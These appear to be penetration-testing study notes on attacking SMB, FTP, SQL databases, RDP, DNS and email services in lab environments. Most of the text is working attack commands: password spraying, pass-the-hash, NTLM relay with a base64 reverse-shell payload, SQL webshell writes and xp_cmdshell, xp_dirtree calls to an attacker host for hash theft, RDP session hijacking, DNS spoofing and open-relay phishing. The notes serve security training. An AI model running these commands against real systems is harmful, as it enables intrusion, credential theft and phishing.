# Attacking Common Services

## Interacting with Common Services

To attack a service you need its purpose, its interaction methods, and the right tools. Internal file shares still mean SMB, NFS, FTP, TFTP, SFTP — cloud (S3, Blob, OneDrive, SharePoint) shows up too, but the interaction concepts transfer.

### SMB

Windows GUI: `WINKEY+R` → `\\<IP>\Finance\` — no auth prompt means anonymous access or your current user already has rights.

CMD:

```cmd
dir \\<TARGET_IP>\Finance
net use n: \\<TARGET_IP>\Finance                              :: map as n:
net use n: \\<TARGET_IP>\Finance /user:plaintext Password123  :: with credentials
dir n: /a-d /s /b | find /c ":\"                              :: count all files (29302 in the demo)
dir n:\*cred* /s /b                                           :: filename hunt — try cred, password, users, secrets, key, source extensions (.cs .go .php .asp...)
findstr /s /i cred n:\*.*                                     :: content hunt
```

PowerShell equivalents (runs both cmdlets and Windows commands; CMD only runs the latter):

```powershell
Get-ChildItem \\<TARGET_IP>\Finance\

# credentialed mapping via PSCredential object
$username = 'plaintext'; $password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\<TARGET_IP>\Finance" -PSProvider "FileSystem" -Credential $cred

(Get-ChildItem -File -Recurse | Measure-Object).Count        :: same count as dir trick
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List   :: grep equivalent
```

Linux — mount it and use native tools:

```bash
sudo apt install cifs-utils
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD>,domain=. //<TARGET_IP>/Finance /mnt/Finance
# or: mount -t cifs //<TARGET_IP>/Finance /mnt/Finance -o credentials=/path/credentialfile
#   (file: username=... / password=... / domain=.)

find /mnt/Finance/ -name *cred*
grep -rn /mnt/Finance/ -ie cred
```

### Email

Sending = SMTP, receiving = POP3 or IMAP. A GUI client like Evolution handles both (`sudo apt-get install evolution`; if bwrap errors: `export WEBKIT_FORCE_SANDBOX=0 && evolution`). Use domain or IP; pick TLS-on-dedicated-port or STARTTLS to match the server — "Check for Supported Types" confirms.

### Databases

Three ways in: CLI utilities (mysql, sqsh, sqlcmd), programming languages, GUI (HeidiSQL, MySQL Workbench, SSMS — Windows only; dbeaver is the multi-engine cross-platform option):

```bash
sudo dpkg -i dbeaver-<version>.deb
dbeaver &
```

### Tools

Per-service toolbox: SMB → smbclient, CrackMapExec, SMBMap, Impacket (psexec.py, smbexec.py); FTP → ftp, lftp, ncftp, filezilla, crossftp; Email → Thunderbird, Claws, Geary, mutt, swaks, sendEmail; Databases → mssql-cli, mycli, mssqlclient.py, dbeaver.

When access fails, work the checklist: authentication, privileges, network connection, firewall rules, protocol support — then chase the specific error code in documentation/forums.

## The Concept of Attacks

A four-category pattern that maps onto every vulnerability:

- **Source** — where the input comes from: code, libraries, config, APIs, user input. Exploitation happens here.
- **Processes** — how the input gets handled: PID, input, data processing, variables, logging. Most bugs live here.
- **Privileges** — what the process is allowed to do: system (SYSTEM/root), user, groups, policies, rules.
- **Destination** — where results go: local (files, records, local services) or network (remote interfaces).

Log4j (CVE-2021-44228) through this lens, twice around the loop:

1. Attacker puts a JNDI lookup in the User-Agent header (Source) → the library misinterprets the string and executes it instead of logging (Process) → logging paths run with admin privileges (Privileges) → the lookup hits the attacker's server hosting a malicious Java class (Destination).
2. That class becomes the new Source, its code is loaded and executed (Process), again with admin rights (Privileges), and the callback gives remote control (Destination).

The template works for analyzing exploits, debugging your own, and walking source code.

## Service Misconfigurations

- **Default/weak credentials** — after grabbing the banner, check for vendor defaults, then the classic combos: `admin:admin`, `admin:password`, `admin:<blank>`, `root:12345678`, `administrator:Password`.
- **Anonymous authentication** — service accepts anyone, no prompt.
- **Misconfigured access rights** — e.g. an upload-only FTP user who can read every document: configs, plaintext creds, PII. RBAC/ACLs exist for this.
- **Unnecessary defaults** — settings shipped for usability, not security (OWASP Security Misconfiguration): extra ports/services/pages/accounts enabled, default accounts unchanged, verbose error handling, security features disabled after upgrades.

## Finding Sensitive Information

The module's chain worth internalizing: anonymous FTP yields an empty file named `johnsmith` → try it as email credentials → it works → search the mailbox for "password" → find MSSQL creds → database built-in command execution → RCE. One "insignificant" detail carried the whole chain.

What counts as sensitive: usernames, email addresses, passwords, DNS records, IPs, source code, config files, PII. Two requirements: understand the service, and know what you're looking for (shaped by the target's business and purpose).

## Attacking FTP

TCP/21. Attack paths: misconfigurations, excessive privileges, known/new vulnerabilities — then mine the contents.

```bash
sudo nmap -sC -sV -p 21 <TARGET_IP>     # ftp-anon script checks + lists anonymous-reachable files
ftp <TARGET_IP>                          # anonymous / no password; ls, cd, get/mget, put/mput
```

Anonymous + sloppy read/write perms = download sensitive data or upload a payload (paired with a web app path traversal → PHP execution).

**Brute forcing** (when no anonymous):

```bash
medusa -u fiona -P rockyou.txt -h <TARGET_IP> -M ftp
```

Most apps defend against this now — spraying is usually the better bet.

**FTP bounce attack** — abuse the server's PORT command to reach/scan hosts you can't reach directly (e.g. an internal-only box behind an internet-exposed FTP):

```bash
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>
```

Modern FTP daemons block this by default; misconfiguration reopens it.

## Attacking SMB

445 = SMB direct over TCP; 139 = SMB over NetBIOS (NBT). Samba is the Unix implementation. MSRPC rides SMB named pipes and is part of the attack surface.

```bash
sudo nmap <TARGET_IP> -sV -sC -p139,445
```

On Windows targets version info is usually absent (Nmap guesses); on Samba you get the version directly (e.g. `Samba smbd 4.6.2` → version-specific exploits).

**Null session enumeration:**

```bash
smbclient -N -L //<TARGET_IP>                 # list shares
smbmap -H <TARGET_IP>                         # shares + permission per share (READ/WRITE/NO ACCESS)
smbmap -H <TARGET_IP> -r notes                # browse a share (-R recursive)
smbmap -H <TARGET_IP> --download "notes\note.txt"
smbmap -H <TARGET_IP> --upload test.txt "notes\test.txt"

rpcclient -U'%' <TARGET_IP>                   # then: enumdomusers (and much more — SANS rpcclient cheat sheet)
./enum4linux-ng.py <TARGET_IP> -A -C          # automated: users, groups, shares, OS, password policy
```

**Brute force / spraying** — brute force risks lockout; spraying one password across a user list is safer (2-3 attempts, 30-60 min apart, if the threshold is known):

```bash
crackmapexec smb <TARGET_IP> -u userlist.txt -p 'Company01!' --local-auth
# [+] WIN7BOX\jurena:Company01! (Pwn3d!)
```

CME stops at first success unless `--continue-on-success`; use `--local-auth` for non-domain-joined targets.

**With admin rights on Windows the surface expands**: remote command execution, SAM hash extraction, logged-on user enumeration, PtH.

RCE — PsExec pattern (uploads a service binary to ADMIN$, starts it via Service Control Manager over DCE/RPC, communicates through a named pipe):

```bash
impacket-psexec administrator:'<PASSWORD>'@<TARGET_IP>     # same shape: smbexec, atexec (Task Scheduler)
crackmapexec smb <TARGET_IP> -u Administrator -p '<PASSWORD>' -x 'whoami' --exec-method smbexec   # -X for PowerShell; atexec is the default fallback
```

```bash
crackmapexec smb <SUBNET>/24 -u administrator -p '<PASSWORD>' --loggedon-users   # every host at once
crackmapexec smb <TARGET_IP> -u administrator -p '<PASSWORD>' --sam              # dump local hashes
crackmapexec smb <TARGET_IP> -u Administrator -H <NTHASH>                        # Pass the Hash
```

**Forced authentication** — Responder poisons LLMNR/NBT-NS/mDNS. Windows name resolution order: hosts file → DNS cache → DNS server → multicast. A typo'd share name (`\\mysharefoder\`) falls through to multicast, Responder answers, and the victim hands over a NetNTLMv2 hash:

```bash
sudo responder -I tun0
# [SMB] NTLMv2-SSP Hash : demouser::WIN7BOX:...
```

Same account produces different-looking hashes every time (randomized client/server challenges) — they're all the same password. Crack:

```bash
hashcat -m 5600 hash.txt rockyou.txt
```

Uncrackable → relay. Disable Responder's own SMB listener first (`/etc/responder/Responder.conf`: `SMB = Off`) so the victim's auth reaches ntlmrelayx instead:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>          # dumps SAM by default
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <base64 revshell>'
```

RPC (beyond enumeration) can change a user's password, create domain users, create shares — given the right configuration/privileges.

## Attacking SQL Databases

High-value targets: creds, PII, payment data, and often high-privileged service accounts. Ports: MSSQL 1433 TCP / 1434 UDP (2433 in "hidden" mode), MySQL 3306.

```bash
nmap -Pn -sV -sC -p1433 <TARGET_IP>      # ms-sql-info + ms-sql-ntlm-info leak version, hostname, domain
```

MSSQL auth: Windows authentication mode (integrated with AD, default) or Mixed mode (SQL-local accounts too). Historical note: CVE-2012-2122 let MySQL 5.6.x auth be bypassed by timing — repeated identical wrong passwords eventually "succeeded."

**Clients:**

```bash
mysql -u julio -p'<PASSWORD>' -h <TARGET_IP>
sqlcmd -S <TARGET_IP> -U julio -P '<PASSWORD>' -y 30 -Y 30          # Windows; -y/-Y = display widths
sqsh -S <TARGET_IP> -U julio -P '<PASSWORD>' -h                      # Linux; -h strips headers
sqsh -S <TARGET_IP> -U .\\julio -P '<PASSWORD>' -h                   # .\ or HOSTNAME\ = Windows/local auth
mssqlclient.py -p 1433 julio@<TARGET_IP>                             # Impacket
```

Default databases worth knowing — MySQL: `mysql`, `information_schema`, `performance_schema`, `sys`. MSSQL: `master`, `msdb`, `model`, `resource`, `tempdb`. These enumerate structure; company data lives elsewhere.

**Enumeration syntax** (sqlcmd needs `GO` to execute):

```sql
SHOW DATABASES;                                    -- mysql
SELECT name FROM master.dbo.sysdatabases           -- mssql
USE htbusers;
SHOW TABLES;                                       -- mysql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES   -- mssql
SELECT * FROM users;
```

**Command execution** — MSSQL's xp_cmdshell (disabled by default; spawned process runs as the SQL service account):

```sql
xp_cmdshell 'whoami'
```

```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Other paths: custom extended procedures, CLR assemblies, Agent jobs, external scripts, `xp_regwrite` for registry-based privesc. MySQL: User Defined Functions can run C/C++ — a command-exec UDF exists but is rare in production.

**Write files:**

```sql
-- MySQL: webshell into a webroot (needs FILE privilege; check secure_file_priv: empty = no limit, NULL = disabled)
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
show variables like "secure_file_priv";
```

```sql
-- MSSQL: enable Ole Automation Procedures (admin), then Scripting.FileSystemObject
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT; DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
```

**Read files:**

```sql
-- MSSQL: any file the service account can read
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-- MySQL (with FILE privilege + secure_file_priv allowing it):
select LOAD_FILE("/etc/passwd");
```

**Steal the service account hash** — xp_dirtree/xp_subdirs do SMB directory listing; point them at your listener:

```bash
sudo responder -I tun0        # or: sudo impacket-smbserver share ./ -smb2support
```

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
```

Crack or relay the resulting NetNTLMv2.

**IMPERSONATE** — escalate inside MSSQL without leaving SQL:

```sql
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- returns sa, ben, valentin...

SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- 0 = not sysadmin
USE master;                                                 -- impersonate from master; other DBs may error
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- sa, 1
REVERT;
```

**Linked servers** — lateral movement between SQL instances. If the link's credentials are sysadmin there, you own that instance:

```sql
SELECT srvname, isremote FROM sysservers;    -- isremote 1 = remote, 0 = linked
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
-- escape single quotes by doubling; chain commands with ;
```

Then xp_cmdshell on the far side. PostgreSQL, SQLite, Oracle, Firebase, MongoDB have their own attack profiles — worth reading beyond this module.

## Attacking RDP

TCP/3389:

```bash
nmap -Pn -p3389 <TARGET_IP>
```

Password guessing risks lockout — spray instead:

```bash
crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' <TARGET_IP> rdp     # mind the -t 1/-t 4 warnings
rdesktop -u admin -p '<PASSWORD>' <TARGET_IP>                # or xfreerdp
```

**RDP session hijacking** — local admin on a box where a juicier user has an active RDP session? Connect into their session with tscon (needs SYSTEM):

```cmd
query user
::  juurena  rdp-tcp#13  1  Active
::  lewen    rdp-tcp#14  2  Active
tscon 2 /dest:rdp-tcp#13                       :: direct, if already SYSTEM

:: from local admin: service trick to get SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

A console as the target user appears. Dead on Server 2019.

**RDP PtH** — GUI access with only an NT hash. Restricted Admin Mode must be enabled (default off, else "Account restrictions..." error):

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:<TARGET_IP> /u:lewen /pth:<NTHASH>
```

Doesn't work everywhere, but with a hash + RDP rights + a GUI-shaped goal, always try it.

## Attacking DNS

UDP/53 default, TCP/53 fallback (large responses). Attacks here hit nearly every application.

```bash
nmap -p53 -Pn -sV -sC <TARGET_IP>
```

**Zone transfer** — AXFR needs no authentication; misconfigured servers hand the whole zone to anyone:

```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
fierce --domain zonetransfer.me          # enumerates NS/SOA and tries the transfer
```

**Subdomain takeover** — CNAME pointing at an expired/claimable third-party (AWS, GitHub, Akamai, Fastly):

```text
sub.target.com.  60  IN  CNAME  anotherdomain.com
```

Claim `anotherdomain.com` → control `sub.target.com` until DNS is fixed.

Enumeration first:

```bash
./subfinder -d inlanefreight.com -v                          # passive scraping of public sources
# pure brute force, works internally without internet:
git clone https://github.com/TheRook/subbrute.git && cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

host support.inlanefreight.com
# "is an alias for inlanefreight.s3.amazonaws.com" → browse it; NoSuchBucket = takeover candidate (claim the S3 bucket name)
```

The can-i-take-over-xyz repo tracks which services are actually vulnerable.

**DNS spoofing / cache poisoning** — MITM the resolver path or exploit the DNS server. Locally with Ettercap: map targets in `/etc/ettercap/etter.dns`:

```text
inlanefreight.com      A   <ATTACKER_IP>
*.inlanefreight.com    A   <ATTACKER_IP>
```

Then Hosts > Scan for Hosts → victim to Target1, gateway to Target2 → Plugins > dns_spoof. Victim's `ping inlanefreight.com` now resolves to you.

## Attacking Email Services

Flow: client → SMTP → server → SMTP → server → IMAP/POP3 → client. POP3 deletes on download by default; IMAP keeps server-side.

Find the mail provider via MX:

```bash
host -t MX hackthebox.eu         # aspmx.l.google.com → G-Suite
host -t MX microsoft.com         # ...outlook.com → Microsoft 365
dig mx plaintext.do | grep "MX" | grep -v ";"
host -t A mail1.inlanefreight.htb.
```

Cloud vs self-hosted decides the attack path. Custom mail server ports: 25 (SMTP), 110 (POP3), 143 (IMAP4), 465 (SMTPS), 587 (SMTP STARTTLS), 993 (IMAPS), 995 (POP3S):

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
```

**Username enumeration** over SMTP (telnet), then spray/brute/guess:

```text
VRFY root        → 252 (exists) / 550 (unknown)
EXPN support-team → lists every member of the alias
MAIL FROM:test@htb.com → RCPT TO:john → 250 (valid recipient) / 550 (unknown)
```

POP3: `USER john` → +OK / -ERR. Automate:

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t <TARGET_IP>
```

**Cloud (Office 365)**:

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

Cloud providers block Hydra-style protocols attacks; custom tools (o365spray, MailSniper for O365, CredKing for Gmail/Okta) target the APIs — and break whenever providers change behavior, so know what your tool does.

**On-prem password attacks:**

```bash
hydra -L users.txt -p 'Company01!' -f <TARGET_IP> pop3     # also smtp / imap
```

**Open relay** — unauthenticated SMTP relay = phishing as anyone (spoof a real internal notification address):

```bash
nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, ... http://mycustomphishinglink.com/' --server <TARGET_IP>
```